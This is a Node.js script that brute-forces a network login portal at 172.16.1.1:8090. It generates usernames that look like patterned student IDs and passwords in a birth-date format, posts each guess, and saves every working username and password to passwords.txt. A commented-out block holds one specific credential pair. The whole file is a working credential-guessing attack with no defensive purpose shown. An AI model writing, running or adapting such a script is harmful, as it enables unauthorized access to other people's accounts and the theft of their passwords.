const request = require('request');
const parseString = require('xml2js').parseString;
const msg = "You have successfully logged in";
const fs = require('fs');


function postRequest(usr, pwd, out) {
    request.post({
        url: "https://172.16.1.1:8090/login.xml",
        rejectUnauthorized: false,
        form: {
            mode: '191',
            username: usr,
            password: pwd,

        }
    },
        function (err, res, body) {

            if (err) { console.log(err); }
            else if (body) {
                parseString(res.body, function (err, result) {

                    if (err) { console.log(err); }
                    else if (result) {
                        if (result.requestresponse.message === msg) {
                            out.val = true;
                            console.log(usr);
                            console.log(pwd);
                            let obj = {
                                username: usr,
                                password: pwd
                            };
                            obj = JSON.stringify(obj);
                            fs.appendFile('passwords.txt', obj + '\n', 'utf8', function (err) {
                                if (err) throw err;
                                console.log('Saved!');
                            });
                        }

                    }
                })


            }

        }
    )
}


function main() {

    for (i = 1; i <= 97; i++) {
        let usr = "imh";

        let out = {
            val: false
        };
        if (i >= 1 && i <= 9) { usr = usr + `1000${i}`; }
        else if (i > 9) { usr = usr + `100${i}`; }

        usr = usr + "18";

        for (j = 1; j <= 31; j++) {

            for (k = 1; k <= 12; k++) {
                var pwd = "";
                if (k <= 9) {
                    pwd = pwd + `${j}` + `0${k}`;
                }
                else {
                    pwd = pwd + `${j}` + `${k}`;
                }
                pwd = pwd + "99";
                postRequest(usr, pwd, out);
                if (out.val == true) break;

            }
            if (out.val == true) break;

        }
        if (out.val == true) break;
    }
}

// function main() {
//     out = {
//         val: false
//     }
//     pwd = "230499"
//     usr = "imh1005218"
//     postRequest(usr, pwd, out);
// }



main();



